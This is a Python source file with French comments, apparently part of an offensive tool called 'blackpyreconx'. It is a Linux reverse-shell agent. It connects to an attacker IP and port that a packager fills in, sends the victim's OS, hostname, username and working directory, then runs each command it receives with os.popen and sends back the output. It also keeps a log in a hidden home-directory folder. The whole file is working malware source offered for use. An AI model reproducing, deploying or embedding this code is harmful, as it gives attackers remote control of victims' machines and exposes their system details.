import os
import socket
import platform
import time
from datetime import datetime
from pathlib import Path

# 📁 Journal local dans le répertoire utilisateur
LOG_DIR = Path.home() / ".blackpyreconx"
LOG_DIR.mkdir(parents=True, exist_ok=True)
LOG_FILE = LOG_DIR / "agent_linux.log"

# 📡 Placeholders LHOST / LPORT (remplacés par packager.py)
ATTACKER_IP = LHOST_PLACEHOLDER
ATTACKER_PORT = LPORT_PLACEHOLDER

def log(msg: str):
    """Journalisation avec timestamp"""
    timestamp = datetime.now().strftime("[%Y-%m-%d %H:%M:%S]")
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(f"{timestamp} {msg}\n")

def get_device_info():
    """Récupère les infos système de la machine Linux"""
    return {
        "OS": platform.system(),
        "Version": platform.version(),
        "Nom": platform.node(),
        "Architecture": platform.machine(),
        "Utilisateur": os.getenv("USER", "N/A"),
        "Répertoire": os.getcwd()
    }

def send_device_info(sock):
    """Envoie les infos de la machine dès la connexion"""
    try:
        info = get_device_info()
        for k, v in info.items():
            sock.send(f"{k}: {v}\n".encode())
    except Exception as e:
        log(f"Erreur lors de l’envoi d’info : {e}")

def reverse_shell(ip: str, port: int):
    """Établit un reverse shell de Linux vers la machine attaquante"""
    try:
        sock = socket.socket()
        sock.connect((ip, port))
        sock.send(b"[+] Agent Linux connecté.\n")

        send_device_info(sock)

        while True:
            command = sock.recv(1024).decode().strip()
            if command.lower() in ["exit", "quit"]:
                break
            output = os.popen(command).read()
            if not output:
                output = "[Aucune sortie]\n"
            sock.send(output.encode(errors="ignore"))
        sock.close()
        log("Session terminée.")
    except Exception as e:
        log(f"Erreur reverse shell : {e}")

if __name__ == "__main__":
    log("Agent Linux lancé.")
    reverse_shell(ATTACKER_IP, ATTACKER_PORT)
